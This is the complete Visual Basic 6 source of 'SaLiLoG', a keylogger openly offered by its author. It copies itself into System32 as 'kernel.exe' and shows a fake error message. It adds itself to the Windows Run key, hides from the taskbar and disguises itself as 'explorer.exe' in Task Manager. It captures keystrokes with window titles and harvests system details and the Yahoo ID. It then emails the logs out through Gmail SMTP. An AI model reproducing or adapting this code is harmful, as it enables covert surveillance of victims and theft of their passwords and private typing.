VERSION 5.00
Begin VB.Form Main 
   ClientHeight    =   6555
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   7995
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   6555
   ScaleWidth      =   7995
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.TextBox Text9 
      Height          =   285
      Left            =   3900
      TabIndex        =   8
      Text            =   "Fake Message"
      Top             =   5160
      Width           =   3615
   End
   Begin VB.TextBox Text8 
      Height          =   285
      Left            =   3900
      TabIndex        =   7
      Text            =   "Receiver's Email"
      Top             =   4800
      Width           =   3615
   End
   Begin VB.TextBox Text7 
      Height          =   285
      Left            =   3900
      TabIndex        =   6
      Text            =   "Sender's Password"
      Top             =   4440
      Width           =   3615
   End
   Begin VB.TextBox Text6 
      Height          =   285
      Left            =   3900
      TabIndex        =   5
      Text            =   "Sender's Mail"
      Top             =   4080
      Width           =   3615
   End
   Begin VB.Timer Timer4 
      Interval        =   750
      Left            =   7560
      Top             =   1560
   End
   Begin VB.TextBox Text5 
      Height          =   285
      Left            =   3900
      TabIndex        =   4
      Text            =   "System32 Dir"
      Top             =   3720
      Width           =   3615
   End
   Begin VB.TextBox Text4 
      Height          =   285
      Left            =   3900
      TabIndex        =   3
      Text            =   "App Path"
      Top             =   3360
      Width           =   3615
   End
   Begin VB.Timer Timer3 
      Interval        =   1000
      Left            =   7560
      Top             =   1080
   End
   Begin VB.TextBox Text3 
      Height          =   3135
      Left            =   0
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   2
      Top             =   3360
      Width           =   3855
   End
   Begin VB.Timer Timer2 
      Interval        =   60000
      Left            =   7560
      Top             =   600
   End
   Begin VB.TextBox Text2 
      Height          =   3255
      Left            =   3900
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   1
      Top             =   60
      Width           =   3615
   End
   Begin VB.Timer Timer1 
      Interval        =   5
      Left            =   7560
      Top             =   120
   End
   Begin VB.TextBox Text1 
      Height          =   3255
      Left            =   0
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   60
      Width           =   3855
   End
   Begin VB.Label Label2 
      Caption         =   "SaLiLoG keylogger server made by Salar Zeynali - Salixem@Gmail.Com"
      Height          =   495
      Left            =   3960
      TabIndex        =   10
      Top             =   1.50000e5
      Width           =   3675
   End
   Begin VB.Label Label1 
      Caption         =   "SaLiLoG keylogger server made by Salar Zeynali - Salixem@Gmail.Com"
      Height          =   435
      Left            =   3900
      TabIndex        =   9
      Top             =   5520
      Width           =   3675
   End
End
Attribute VB_Name = "Main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'                    SaLiLoG 1.0
'                  By SaLar Zeynali
'        Salixem@Gmail.Com - S4LiX3M@Yahoo.Com
'  _________      .____    .______  ___        _____
' /   _____/____  |    |   |__\   \/  /____   /     \
' \_____  \\__  \ |    |   |  |\     // __ \ /  \ /  \
' /        \/ __ \|    |___|  |/     \  ___//    Y    \
'/_______  (____  /_______ \__/___/\  \___  >____|__  /
'        \/     \/        \/        \_/   \/        \/

Private Declare Function FindWindow& Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String)
Private Declare Function FindWindowEx& Lib "user32" Alias "FindWindowExA" (ByVal hWndParent As Long, ByVal hWndChildAfter As Long, ByVal lpClassName As String, ByVal lpWindowName As String)

Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Const REG_SZ = 1
Const HKEY_CURRENT_USER = &H80000001
Const REGKEY = "Software\Microsoft\Windows\CurrentVersion\Run"
Const KEY_WRITE = &H20006
Dim Path As Long

Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long

Private LastWindow As String
Private LastHandle As Long
Private dKey(255) As Long
Private Const VK_SHIFT = &H10
Private Const VK_CTRL = &H11
Private Const VK_ALT = &H12
Private Const VK_CAPITAL = &H14
Private ChangeChr(255) As String
Private AltDown As Boolean

Private Sub Form_Load()
Text4 = App.Path 'Application path
Text5 = FSF32 'System32 path
'Copy itself to system32
If Text4 = Text5 Then
Else
FileCopy App.Path & "\" & App.EXEName & ".exe", Text5 & "\kernel.exe"
Shell Text5 & "\kernel.exe"
End
End If

'Load saved data
Dim PropBag As PropertyBag
Set PropBag = New PropertyBag
Set PropBag = LoadCompiledData
If PropBag.ReadProperty("error", "") = "true" Then
MsgBox "Please compile this exe with SaLiLoG"
End
End If
Text6.Text = PropBag.ReadProperty("SndMail", "")
Text7.Text = PropBag.ReadProperty("SndPwd", "")
Text8.Text = PropBag.ReadProperty("RcvMail", "")
Text9.Text = PropBag.ReadProperty("FakeMsg", "")

'Show fake message
If Text9 = "" Then
Else
MsgBox Text9, vbOKOnly + vbCritical, "Error occured"
End If


'System info
Dim os As String, over As String, op As String
GetOperate os, over, op
Text2 = Text2 & vbCrLf & "Windows: " & os & " (" & Environ("OS") & ")"
Text2 = Text2 & vbCrLf & "Windows ver: " & over
Text2 = Text2 & vbCrLf & "Service Pack: " & op
Text2 = Text2 & vbCrLf & "Number Of Processors: " & Environ("NUMBER_OF_PROCESSORS")
Text2 = Text2 & vbCrLf & "Processor Identifier: " & Environ("PROCESSOR_IDENTIFIER")
Text2 = Text2 & vbCrLf & "Computer name: " & Environ("computername")
Text2 = Text2 & vbCrLf & "Company name: " & Environ("companyname")
Text2 = Text2 & vbCrLf & "Username: " & Environ("username")
Text2 = Text2 & vbCrLf & "Is Administrator: " & CBool(IsNTAdmin(ByVal 0&, ByVal 0&))
Text2 = Text2 & vbCrLf & "Screen resoulotion: " & Screen.Width / Screen.TwipsPerPixelX & "x" & Screen.Height / Screen.TwipsPerPixelY
Text2 = Text2 & vbCrLf & "Sysytem dir: " & FSF32
Text2 = Text2 & vbCrLf & "Windows dir: " & Environ("SystemRoot")
Text2 = Text2 & vbCrLf & "Temp dir: " & Environ("temp")
Text2 = Text2 & vbCrLf & String(80, "-")
Dim MemStat As MEMORYSTATUS
GlobalMemoryStatus MemStat
Text2 = Text2 & vbCrLf & "Total Physical Memory (Ram): " & MemStat.dwTotalPhys / 1024 ^ 2 & " MB"
Text2 = Text2 & vbCrLf & "Availble Physical Memory (Ram): " & MemStat.dwAvailPhys / 1024 ^ 2 & " MB"
Text2 = Text2 & vbCrLf & "Total Virtual Memory: " & MemStat.dwTotalVirtual / 1024 ^ 2 & " MB"
Text2 = Text2 & vbCrLf & "Availble Virtual Memory: " & MemStat.dwAvailVirtual / 1024 ^ 2 & " MB"
Text2 = Text2 & vbCrLf & "Total Page File: " & MemStat.dwTotalPageFile / 1024 ^ 2 & " MB"
Text2 = Text2 & vbCrLf & "Availble Page File: " & MemStat.dwAvailPageFile / 1024 ^ 2 & " MB"
Text2 = Text2 & vbCrLf & String(80, "-")
Text2 = Text2 & vbCrLf & "Connected to internet: " & CheckInternetConnection
Text2 = Text2 & vbCrLf & "IP Address: " & GIFNHost("")
Text2 = Text2 & vbCrLf & String(80, "-")
Text2 = Text2 & vbCrLf & "Yahoo ID: " & RGGetKeyValue(HKEY_CURRENT_USER, "Software\yahoo\pager", "Yahoo! User ID")
Text2 = Text2 & vbCrLf & String(80, "-")
Text2 = Text2 & vbCrLf & "Ie Version: " & RGGetKeyValue(HKEY_LOCAL_MACHINE, "Software\Microsoft\Internet Explorer", "Version")
Text2 = Text2 & vbCrLf & "Ie HomePage: " & RGGetKeyValue(HKEY_CURRENT_USER, "Software\Microsoft\Internet Explorer\Main", "Start Page")

On Error Resume Next
App.TaskVisible = False
ChangeChr(33) = "[PageUp]"
ChangeChr(34) = "[PageDown]"
ChangeChr(35) = "[End]"
ChangeChr(36) = "[Home]"
ChangeChr(45) = "[Insert]"
ChangeChr(46) = "[Delete]"
ChangeChr(48) = ")"
ChangeChr(49) = "!"
ChangeChr(50) = "@"
ChangeChr(51) = "#"
ChangeChr(52) = "$"
ChangeChr(53) = "%"
ChangeChr(54) = "^"
ChangeChr(55) = "&"
ChangeChr(56) = "*"
ChangeChr(57) = "("
ChangeChr(186) = ";"
ChangeChr(187) = "="
ChangeChr(188) = ","
ChangeChr(189) = "-"
ChangeChr(190) = "."
ChangeChr(191) = "/"
ChangeChr(219) = "["
ChangeChr(220) = "\"
ChangeChr(221) = "]"
ChangeChr(222) = "'"
ChangeChr(86) = ":"
ChangeChr(87) = "+"
ChangeChr(88) = "<"
ChangeChr(89) = "_"
ChangeChr(90) = ">"
ChangeChr(91) = "?"
ChangeChr(119) = "{"
ChangeChr(120) = "|"
ChangeChr(121) = "}"
ChangeChr(122) = """"
ChangeChr(96) = "0"
ChangeChr(97) = "1"
ChangeChr(98) = "2"
ChangeChr(99) = "3"
ChangeChr(100) = "4"
ChangeChr(101) = "5"
ChangeChr(102) = "6"
ChangeChr(103) = "7"
ChangeChr(104) = "8"
ChangeChr(105) = "9"
ChangeChr(106) = "*"
ChangeChr(107) = "+"
ChangeChr(109) = "-"
ChangeChr(110) = "."
ChangeChr(111) = "/"
ChangeChr(192) = "`"
ChangeChr(92) = "~"
End Sub

Function TypeWindow()
'Finding the window that victim is writing something in.
Dim Handle As Long
Dim textlen As Long
Dim WindowText As String
Handle = GetForegroundWindow
LastHandle = Handle
textlen = GetWindowTextLength(Handle) + 1
WindowText = Space(textlen)
svar = GetWindowText(Handle, WindowText, textlen)
WindowText = Left(WindowText, Len(WindowText) - 1)
If WindowText <> LastWindow Then
If Text1 <> "" Then Text1 = Text1 & vbCrLf & vbCrLf
Text1 = Text1 & "====" & vbCrLf & WindowText & vbCrLf & "====" & vbCrLf
LastWindow = WindowText
End If
End Function

Private Sub Timer1_Timer()
'Keylogging
If GetAsyncKeyState(VK_ALT) = 0 And AltDown = True Then
AltDown = False
Text1 = Text1 & "[ALTUP]"
End If

For i = Asc("A") To Asc("Z")
If GetAsyncKeyState(i) = -32767 Then
TypeWindow
If GetAsyncKeyState(VK_SHIFT) < 0 Then
If GetKeyState(VK_CAPITAL) > 0 Then
Text1 = Text1 & LCase(Chr(i))
Exit Sub
Else
Text1 = Text1 & UCase(Chr(i))
Exit Sub
End If
Else
If GetKeyState(VK_CAPITAL) > 0 Then
Text1 = Text1 & UCase(Chr(i))
Exit Sub
Else
Text1 = Text1 & LCase(Chr(i))
Exit Sub
End If
End If
End If
Next

For i = 48 To 57
If GetAsyncKeyState(i) = -32767 Then
TypeWindow
  
If GetAsyncKeyState(VK_SHIFT) < 0 Then
Text1 = Text1 & ChangeChr(i)
Exit Sub
Else
Text1 = Text1 & Chr(i)
Exit Sub
End If
End If
Next

For i = 186 To 192
If GetAsyncKeyState(i) = -32767 Then
TypeWindow

If GetAsyncKeyState(VK_SHIFT) < 0 Then
Text1 = Text1 & ChangeChr(i - 100)
Exit Sub
Else
Text1 = Text1 & ChangeChr(i)
Exit Sub
End If
End If
Next

For i = 219 To 222
If GetAsyncKeyState(i) = -32767 Then
TypeWindow

If GetAsyncKeyState(VK_SHIFT) < 0 Then
Text1 = Text1 & ChangeChr(i - 100)
Exit Sub
Else
Text1 = Text1 & ChangeChr(i)
Exit Sub
End If
End If
Next

For i = 96 To 111
If GetAsyncKeyState(i) = -32767 Then
TypeWindow

If GetAsyncKeyState(VK_ALT) < 0 And AltDown = False Then
AltDown = True
Text1 = Text1 & "[ALTDOWN]"
Else
If GetAsyncKeyState(VK_ALT) >= 0 And AltDown = True Then
AltDown = False
Text1 = Text1 & "[ALTUP]"
End If
End If

Text1 = Text1 & ChangeChr(i)
Exit Sub
End If
Next

If GetAsyncKeyState(32) = -32767 Then
TypeWindow
Text1 = Text1 & " "
End If

If GetAsyncKeyState(13) = -32767 Then
TypeWindow
Text1 = Text1 & vbCrLf
End If

If GetAsyncKeyState(8) = -32767 Then
TypeWindow
Dim backlength As Integer
Dim backString As String
backlength = Len(Text1.Text)
backString = Mid(Text1.Text, 1, (backlength - 1))
Text1.Text = backString
End If

If GetAsyncKeyState(37) = -32767 Then
TypeWindow
Text1 = Text1 & "[LeftArrow]"
End If

If GetAsyncKeyState(38) = -32767 Then
TypeWindow
Text1 = Text1 & "[UpArrow]"
End If

If GetAsyncKeyState(39) = -32767 Then
TypeWindow
Text1 = Text1 & "[RightArrow]"
End If

If GetAsyncKeyState(40) = -32767 Then
TypeWindow
Text1 = Text1 & "[DownArrow]"
End If

If GetAsyncKeyState(9) = -32767 Then
TypeWindow
Text1 = Text1 & "[Tab]"
End If

If GetAsyncKeyState(27) = -32767 Then
TypeWindow
Text1 = Text1 & "[Escape]"
End If

For i = 45 To 46
If GetAsyncKeyState(i) = -32767 Then
TypeWindow
Text1 = Text1 & ChangeChr(i)
End If
Next

For i = 33 To 36
If GetAsyncKeyState(i) = -32767 Then
TypeWindow
Text1 = Text1 & ChangeChr(i)
End If
Next

If GetAsyncKeyState(1) = -32767 Then
If (LastHandle = GetForegroundWindow) And LastHandle <> 0 Then 'we make sure that click is on the page that we are loging bute click log start when we type something in window
Text1 = Text1 & "[LeftClick]"
End If
End If
End Sub

Private Sub Timer2_Timer()
'Refresh system info every 1 minute
On Error Resume Next
Text2 = ""
Dim os As String, over As String, op As String
GetOperate os, over, op
Text2 = Text2 & vbCrLf & "Windows: " & os & " (" & Environ("OS") & ")"
Text2 = Text2 & vbCrLf & "Windows ver: " & over
Text2 = Text2 & vbCrLf & "Service Pack: " & op
Text2 = Text2 & vbCrLf & "Number Of Processors: " & Environ("NUMBER_OF_PROCESSORS")
Text2 = Text2 & vbCrLf & "Processor Identifier: " & Environ("PROCESSOR_IDENTIFIER")
Text2 = Text2 & vbCrLf & "Computer name: " & Environ("computername")
Text2 = Text2 & vbCrLf & "Company name: " & Environ("companyname")
Text2 = Text2 & vbCrLf & "Username: " & Environ("username")
Text2 = Text2 & vbCrLf & "Is Administrator: " & CBool(IsNTAdmin(ByVal 0&, ByVal 0&))
Text2 = Text2 & vbCrLf & "Screen resoulotion: " & Screen.Width / Screen.TwipsPerPixelX & "x" & Screen.Height / Screen.TwipsPerPixelY
Text2 = Text2 & vbCrLf & "Sysytem dir: " & FSF32
Text2 = Text2 & vbCrLf & "Windows dir: " & Environ("SystemRoot")
Text2 = Text2 & vbCrLf & "Temp dir: " & Environ("temp")
Text2 = Text2 & vbCrLf & String(80, "-")
Dim MemStat As MEMORYSTATUS
GlobalMemoryStatus MemStat
Text2 = Text2 & vbCrLf & "Total Physical Memory (Ram): " & MemStat.dwTotalPhys / 1024 ^ 2 & " MB"
Text2 = Text2 & vbCrLf & "Availble Physical Memory (Ram): " & MemStat.dwAvailPhys / 1024 ^ 2 & " MB"
Text2 = Text2 & vbCrLf & "Total Virtual Memory: " & MemStat.dwTotalVirtual / 1024 ^ 2 & " MB"
Text2 = Text2 & vbCrLf & "Availble Virtual Memory: " & MemStat.dwAvailVirtual / 1024 ^ 2 & " MB"
Text2 = Text2 & vbCrLf & "Total Page File: " & MemStat.dwTotalPageFile / 1024 ^ 2 & " MB"
Text2 = Text2 & vbCrLf & "Availble Page File: " & MemStat.dwAvailPageFile / 1024 ^ 2 & " MB"
Text2 = Text2 & vbCrLf & String(80, "-")
Text2 = Text2 & vbCrLf & "Connected to internet: " & CheckInternetConnection
Text2 = Text2 & vbCrLf & "IP Address: " & GIFNHost("")
Text2 = Text2 & vbCrLf & String(80, "-")
Text2 = Text2 & vbCrLf & "Yahoo ID: " & RGGetKeyValue(HKEY_CURRENT_USER, "Software\yahoo\pager", "Yahoo! User ID")
Text2 = Text2 & vbCrLf & String(80, "-")
Text2 = Text2 & vbCrLf & "Ie Version: " & RGGetKeyValue(HKEY_LOCAL_MACHINE, "Software\Microsoft\Internet Explorer", "Version")
Text2 = Text2 & vbCrLf & "Ie HomePage: " & RGGetKeyValue(HKEY_CURRENT_USER, "Software\Microsoft\Internet Explorer\Main", "Start Page")
End Sub

Private Sub Timer3_Timer()
On Error Resume Next
'Add to startup
If RegOpenKeyEx(HKEY_CURRENT_USER, REGKEY, 0, KEY_WRITE, Path) Then Exit Sub
RegSetValueEx Path, App.Title, 0, REG_SZ, ByVal App.Path & "\" & App.EXEName & ".exe", Len(App.Path & "\" & App.EXEName & ".exe")

'Check if length of logged textbox is more than 700 then send email
If Len(Text1) > 700 Then
Text3 = Text2 & vbCrLf & "_________________________________________" & vbCrLf & Text1

'Mail sending process
Set correio = CreateObject("CDO.Message")
correio.From = Text6
correio.To = Text8
correio.Subject = "KeyLog"
correio.TextBody = Text3 & vbCrLf & vbCrLf & "Mail sent by SaLiLoG keylogger server | By Salar Zeynali - Salixem@Gmail.Com"
correio.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
correio.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
correio.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
correio.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.gmail.com"
correio.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 465
correio.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = Text6
correio.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = Text7
correio.Configuration.Fields.Update
correio.Send

'After sending clear textboxes to start again
Text1 = ""
Text3 = ""
End If
End Sub

Private Function ModifyExe(ByVal pDest As String, ByVal pSource As String, Optional ByVal Delete As Boolean) As Boolean
Dim RetVal As Long
Dim RetStr As String
Dim i As Long, ii As Long
Dim tCount As Long
Dim ExitCount As Long
RetVal = FindTaskManager
If RetVal Then
Do While ii < 26
RetStr = GetItemText(RetVal, i, ii)
If RetStr = vbNullString Then
If i = 0 Then
i = 1
ii = -1
Else
Exit Do
End If
ElseIf InStr(LCase$(RetStr), ".exe") Then
tCount = GetItemCount(RetVal)
For i = i To tCount - 1
RetStr = GetItemText(RetVal, i, ii)
If LCase$(RetStr) = LCase$(pSource) Then
If Delete Then
Call DeleteItem(RetVal, i)
Else
Call SetItemText(RetVal, pDest, i, ii)
End If
ModifyExe = True
Exit Do
End If
Next i
End If
ii = ii + 1
Loop
End If
End Function

Private Function FindTaskManager() As Long
'Find TaskManager window to change process name
Dim RetVal As Long
RetVal = FindWindow("#32770", "Windows Task Manager")
RetVal = FindWindowEx(RetVal, ByVal 0&, "#32770", vbNullString)
RetVal = FindWindowEx(RetVal, ByVal 0&, "SysListView32", "Processes")
FindTaskManager = RetVal
End Function
Private Sub Timer4_Timer()
'Change process name in TaskManager
On Error Resume Next
ModifyExe "explorer.exe", App.EXEName & ".exe"
End Sub

